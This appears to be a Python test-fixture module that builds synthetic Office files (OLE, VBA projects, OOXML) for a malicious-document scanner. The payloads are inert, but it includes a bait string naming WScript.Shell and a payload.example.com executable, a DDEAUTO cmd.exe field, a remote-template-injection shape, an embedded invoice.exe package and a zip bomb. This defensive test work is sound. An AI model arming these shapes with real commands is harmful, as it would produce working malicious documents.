"""Synthetic Office fixtures: a minimal OLE (Compound File Binary) writer, a VBA project
builder, and OOXML packages.

The macros are harmless text (a MsgBox) and are never run; suspicious-looking keywords
appear only inside string literals or comments so that keyword scanners have something
to find. External references point at example.com (RFC 2606).
"""

from __future__ import annotations

import io
import struct
import zipfile

SECTOR = 512
MINI_SECTOR = 64
MINI_CUTOFF = 4096
FREESECT, ENDOFCHAIN, FATSECT = 0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFD
NOSTREAM = 0xFFFFFFFF

MSI_CLSID = bytes.fromhex("84100C0000000000C000000000000046")


# OLE / CFB writer ----------------------------------------------------------------------

class _Node:
    def __init__(self, name: str, data: bytes | None = None):
        self.name = name
        self.data = data  # None for storages
        self.children: dict[str, _Node] = {}
        self.sid = 0
        self.left = self.right = self.child = NOSTREAM
        self.start = ENDOFCHAIN
        self.size = 0


def _sort_key(name: str):
    return (len(name), name.upper())


def _build_tree(nodes: list[_Node]) -> int:
    """Balanced binary search tree over siblings; returns the root sid."""
    if not nodes:
        return NOSTREAM
    mid = len(nodes) // 2
    root = nodes[mid]
    root.left = _build_tree(nodes[:mid])
    root.right = _build_tree(nodes[mid + 1:])
    return root.sid


def build_ole(streams: dict[str, bytes], root_clsid: bytes = bytes(16)) -> bytes:
    """Write a CFB v3 file. Keys are '/'-separated stream paths."""
    root = _Node("Root Entry")
    for path, data in streams.items():
        node = root
        parts = path.split("/")
        for part in parts[:-1]:
            node = node.children.setdefault(part, _Node(part))
        node.children[parts[-1]] = _Node(parts[-1], data)

    order: list[_Node] = []

    def number(node: _Node) -> None:
        node.sid = len(order)
        order.append(node)
        for child in sorted(node.children.values(), key=lambda n: _sort_key(n.name)):
            number(child)

    number(root)

    def link(node: _Node) -> None:
        kids = sorted(node.children.values(), key=lambda n: _sort_key(n.name))
        node.child = _build_tree(kids)
        for k in kids:
            link(k)

    link(root)

    # Mini stream for small streams, regular sectors for large ones.
    mini = bytearray()
    minifat: list[int] = []
    big: list[tuple[_Node, bytes]] = []
    for node in order:
        if node.data is None:
            continue
        node.size = len(node.data)
        if node.size == 0:
            node.start = ENDOFCHAIN
        elif node.size < MINI_CUTOFF:
            first = len(mini) // MINI_SECTOR
            count = -(-node.size // MINI_SECTOR)
            node.start = first
            minifat += [first + i + 1 for i in range(count - 1)] + [ENDOFCHAIN]
            mini += node.data.ljust(count * MINI_SECTOR, b"\0")
        else:
            big.append((node, node.data))

    sectors: list[bytes] = []
    fat: list[int] = []

    def alloc(data: bytes) -> int:
        if not data:
            return ENDOFCHAIN
        first = len(sectors)
        count = -(-len(data) // SECTOR)
        for i in range(count):
            sectors.append(data[i * SECTOR:(i + 1) * SECTOR].ljust(SECTOR, b"\0"))
            fat.append(first + i + 1 if i < count - 1 else ENDOFCHAIN)
        return first

    for node, data in big:
        node.start = alloc(data)
    root.start = alloc(bytes(mini))
    root.size = len(mini)
    minifat_bytes = b"".join(struct.pack("<I", v) for v in minifat)
    minifat_bytes = minifat_bytes.ljust(-(-len(minifat_bytes) // SECTOR) * SECTOR, b"\xff")
    minifat_start = alloc(minifat_bytes)
    minifat_count = len(minifat_bytes) // SECTOR

    entries = bytearray()
    for node in order:
        name = node.name.encode("utf-16-le") + b"\0\0"
        etype = 5 if node is root else (1 if node.data is None else 2)
        clsid = root_clsid if node is root else bytes(16)
        entries += struct.pack(
            "<64sHBBIII16sIQQIQ", name.ljust(64, b"\0"), len(name), etype, 1,
            node.left, node.right, node.child, clsid, 0, 0, 0, node.start, node.size,
        )
    entries = bytes(entries).ljust(-(-len(entries) // SECTOR) * SECTOR, b"\0")
    # Unused directory slots must be empty entries with NOSTREAM links.
    empty = struct.pack("<64sHBBIII16sIQQIQ", bytes(64), 0, 0, 0, NOSTREAM, NOSTREAM,
                        NOSTREAM, bytes(16), 0, 0, 0, 0, 0)
    used = len(order) * 128
    entries = entries[:used] + empty * ((len(entries) - used) // 128)
    dir_start = alloc(entries)

    # FAT sectors describe themselves too; iterate until the count is stable.
    n_fat = 1
    while True:
        total = len(sectors) + n_fat
        if -(-total // (SECTOR // 4)) <= n_fat:
            break
        n_fat += 1
    fat_start = len(sectors)
    fat += [FATSECT] * n_fat
    fat += [FREESECT] * (n_fat * (SECTOR // 4) - len(fat))
    fat_bytes = b"".join(struct.pack("<I", v) for v in fat)
    for i in range(n_fat):
        sectors.append(fat_bytes[i * SECTOR:(i + 1) * SECTOR])
    assert n_fat <= 109

    difat = [fat_start + i for i in range(n_fat)] + [FREESECT] * (109 - n_fat)
    header = struct.pack(
        "<8s16sHHHHH6sIIIIIIIII", bytes.fromhex("D0CF11E0A1B11AE1"), bytes(16), 0x3E, 3,
        0xFFFE, 9, 6, bytes(6), 0, n_fat, dir_start, 0, MINI_CUTOFF,
        minifat_start if minifat else ENDOFCHAIN, minifat_count if minifat else 0,
        ENDOFCHAIN, 0,
    ) + b"".join(struct.pack("<I", v) for v in difat)
    assert len(header) == SECTOR
    return header + b"".join(sectors)


# VBA project ---------------------------------------------------------------------------

def ovba_compress(data: bytes) -> bytes:
    """MS-OVBA compressed container using literal tokens only (valid, just not smaller).
    One chunk holds up to 4096 decompressed bytes but at most 4096 compressed bytes, so
    literal-only chunks carry 3640 bytes each; keep fixtures under that."""
    assert len(data) <= 3640, "fixture VBA text too long for a literal-only chunk"
    body = bytearray()
    for i in range(0, len(data), 8):
        body.append(0)  # flag byte: all eight tokens are literals
        body += data[i:i + 8]
    header = (len(body) + 2 - 3) | (0b011 << 12) | (1 << 15)
    return b"\x01" + struct.pack("<H", header) + bytes(body)


def _rec(rid: int, payload: bytes) -> bytes:
    return struct.pack("<HI", rid, len(payload)) + payload


def _dir_stream(modules: list[str]) -> bytes:
    name = b"VBAProject"
    out = bytearray()
    out += _rec(0x0001, struct.pack("<I", 1))           # PROJECTSYSKIND: win32
    out += _rec(0x0002, struct.pack("<I", 0x409))       # PROJECTLCID
    out += _rec(0x0014, struct.pack("<I", 0x409))       # PROJECTLCIDINVOKE
    out += _rec(0x0003, struct.pack("<H", 1252))        # PROJECTCODEPAGE
    out += _rec(0x0004, name)                           # PROJECTNAME
    out += _rec(0x0005, b"") + _rec(0x0040, b"")        # PROJECTDOCSTRING (+ unicode)
    out += _rec(0x0006, b"") + _rec(0x003D, b"")        # PROJECTHELPFILEPATH (+ 2)
    out += _rec(0x0007, struct.pack("<I", 0))           # PROJECTHELPCONTEXT
    out += _rec(0x0008, struct.pack("<I", 0))           # PROJECTLIBFLAGS
    out += struct.pack("<HIIH", 0x0009, 4, 1, 0)        # PROJECTVERSION
    out += _rec(0x000C, b"") + _rec(0x003C, b"")        # PROJECTCONSTANTS (+ unicode)
    out += _rec(0x000F, struct.pack("<H", len(modules)))  # PROJECTMODULES
    out += _rec(0x0013, struct.pack("<H", 0xFFFF))      # PROJECTCOOKIE
    for m in modules:
        mb, mu = m.encode("ascii"), m.encode("utf-16-le")
        out += _rec(0x0019, mb) + _rec(0x0047, mu)      # MODULENAME (+ unicode)
        out += _rec(0x001A, mb) + _rec(0x0032, mu)      # MODULESTREAMNAME (+ unicode)
        out += _rec(0x001C, b"") + _rec(0x0048, b"")    # MODULEDOCSTRING (+ unicode)
        out += _rec(0x0031, struct.pack("<I", 0))       # MODULEOFFSET: source at 0
        out += _rec(0x001E, struct.pack("<I", 0))       # MODULEHELPCONTEXT
        out += _rec(0x002C, struct.pack("<H", 0xFFFF))  # MODULECOOKIE
        out += _rec(0x0021, b"")                        # MODULETYPE: procedural
        out += _rec(0x002B, b"")                        # TERMINATOR
    out += _rec(0x0010, b"")                            # end of dir stream
    return bytes(out)


def _project_stream(modules: list[str]) -> bytes:
    lines = ['ID="{00000000-0000-0000-0000-000000000000}"']
    lines += [f"Module={m}" for m in modules]
    lines += ['Name="VBAProject"', 'HelpContextID="0"', 'VersionCompatible32="393222000"',
              "", "[Host Extender Info]",
              "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
              "", "[Workspace]"]
    lines += [f"{m}=0, 0, 0, 0, C" for m in modules]
    return ("\r\n".join(lines) + "\r\n").encode("ascii")


def vba_streams(modules: dict[str, str], prefix: str = "") -> dict[str, bytes]:
    """Streams of a VBA project, optionally under a storage prefix such as 'Macros/'."""
    names = list(modules)
    streams = {
        f"{prefix}PROJECT": _project_stream(names),
        f"{prefix}PROJECTwm": b"".join(m.encode() + b"\0" + m.encode("utf-16-le") + b"\0\0"
                                       for m in names) + b"\0\0",
        f"{prefix}VBA/_VBA_PROJECT": struct.pack("<HHBH", 0x61CC, 0xFFFF, 0, 0),
        f"{prefix}VBA/dir": ovba_compress(_dir_stream(names)),
    }
    for name, source in modules.items():
        text = f'Attribute VB_Name = "{name}"\r\n' + source.replace("\n", "\r\n")
        streams[f"{prefix}VBA/{name}"] = ovba_compress(text.encode("latin-1"))
    return streams


HARMLESS_AUTOOPEN = '''Sub AutoOpen()
    ' Fixture macro: shows a message box and nothing else.
    MsgBox "unopened test fixture"
End Sub

Sub NeverCalled()
    ' Keyword bait for scanners, inside a string that is never used:
    Dim s As String
    s = "Shell CreateObject WScript.Shell http://payload.example.com/x.exe"
End Sub
'''

HARMLESS_PLAIN = '''Sub Hello()
    MsgBox "hello"
End Sub
'''


def vba_project_bin(source: str = HARMLESS_AUTOOPEN) -> bytes:
    return build_ole(vba_streams({"Module1": source}))


def legacy_doc(source: str | None = HARMLESS_AUTOOPEN) -> bytes:
    """A Word 97-2003 shaped OLE file: WordDocument stream, optional Macros storage."""
    streams = {"WordDocument": b"\xec\xa5" + bytes(1534), "1Table": bytes(512)}
    if source is not None:
        streams |= vba_streams({"Module1": source}, prefix="Macros/")
    return build_ole(streams)


def legacy_xls() -> bytes:
    return build_ole({"Workbook": bytes(600)})


def msi_like() -> bytes:
    return build_ole({"SummaryInformation": bytes(100)}, root_clsid=MSI_CLSID)


def ole_with_package(filename: str = "invoice.exe") -> bytes:
    """A .doc-shaped file with an embedded OLE Package object (Ole10Native)."""
    name = filename.encode() + b"\0"
    src = b"C:\\Users\\fixture\\" + name
    tmp = b"C:\\Users\\fixture\\AppData\\Local\\Temp\\" + name
    payload = b"benign fixture payload, not an executable"
    native = (struct.pack("<H", 2) + name + src + struct.pack("<HH", 0, 3)
              + struct.pack("<I", len(tmp)) + tmp + struct.pack("<I", len(payload)) + payload)
    native = struct.pack("<I", len(native)) + native
    return build_ole({
        "WordDocument": b"\xec\xa5" + bytes(1534),
        "ObjectPool/_1234567890/\x01Ole10Native": native,
        "ObjectPool/_1234567890/\x01CompObj": bytes(76),
    })


# OOXML ---------------------------------------------------------------------------------

CONTENT_TYPES = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="xml" ContentType="application/xml"/></Types>'
)
W_NS = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
R_NS = 'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"'
REL_NS = "http://schemas.openxmlformats.org/package/2006/relationships"
REL_TYPE = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"


def _document_xml(body: str = "<w:p><w:r><w:t>fixture</w:t></w:r></w:p>") -> str:
    return f'<?xml version="1.0"?><w:document {W_NS} {R_NS}><w:body>{body}</w:body></w:document>'


def _rels(rels: list[tuple[str, str, str, bool]]) -> str:
    items = "".join(
        f'<Relationship Id="{rid}" Type="{REL_TYPE}{rtype}" Target="{target}"'
        + (' TargetMode="External"' if external else "") + "/>"
        for rid, rtype, target, external in rels
    )
    return f'<?xml version="1.0"?><Relationships xmlns="{REL_NS}">{items}</Relationships>'


def ooxml(members: dict[str, bytes | str]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES)
        for name, data in members.items():
            zf.writestr(name, data)
    return buf.getvalue()


def docm(source: str = HARMLESS_AUTOOPEN) -> bytes:
    return ooxml({
        "word/document.xml": _document_xml(),
        "word/vbaProject.bin": vba_project_bin(source),
        "word/_rels/document.xml.rels": _rels([("rId1", "vbaProject", "vbaProject.bin", False)]),
    })


def docx_plain() -> bytes:
    return ooxml({"word/document.xml": _document_xml()})


def docx_remote_template() -> bytes:
    """Template injection shape: settings.xml.rels points attachedTemplate at a URL."""
    return ooxml({
        "word/document.xml": _document_xml(),
        "word/settings.xml": f'<?xml version="1.0"?><w:settings {W_NS} {R_NS}>'
                             '<w:attachedTemplate r:id="rId1"/></w:settings>',
        "word/_rels/settings.xml.rels": _rels([
            ("rId1", "attachedTemplate", "http://templates.example.com/fixture.dotm", True),
        ]),
        "word/_rels/document.xml.rels": _rels([
            ("rId2", "hyperlink", "https://www.example.org/help", True),
        ]),
    })


def docx_dde() -> bytes:
    # A field split across runs, as Word writes it. The command is inert text.
    body = ('<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
            '<w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\'
            '</w:instrText></w:r><w:r><w:instrText>cmd.exe "/c echo fixture"</w:instrText></w:r>'
            '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
    return ooxml({"word/document.xml": _document_xml(body)})


def docx_with_embedded_package(filename: str = "invoice.exe") -> bytes:
    ole = ole_with_package(filename)
    return ooxml({
        "word/document.xml": _document_xml(),
        "word/embeddings/oleObject1.bin": ole,
    })


def xlsm_with_macrosheet() -> bytes:
    return ooxml({
        "xl/workbook.xml": '<?xml version="1.0"?><workbook/>',
        "xl/macrosheets/sheet1.xml": '<?xml version="1.0"?><xm:macrosheet '
                                     'xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"/>',
    })


def ooxml_bomb_vba(size: int = 64 * 1024 * 1024) -> bytes:
    """vbaProject.bin that inflates to `size` zero bytes: refused by the size/ratio caps."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", CONTENT_TYPES)
        zf.writestr("word/document.xml", _document_xml())
        with zf.open("word/vbaProject.bin", "w", force_zip64=True) as f:
            chunk = bytes(1 << 20)
            for _ in range(size // len(chunk)):
                f.write(chunk)
    return buf.getvalue()
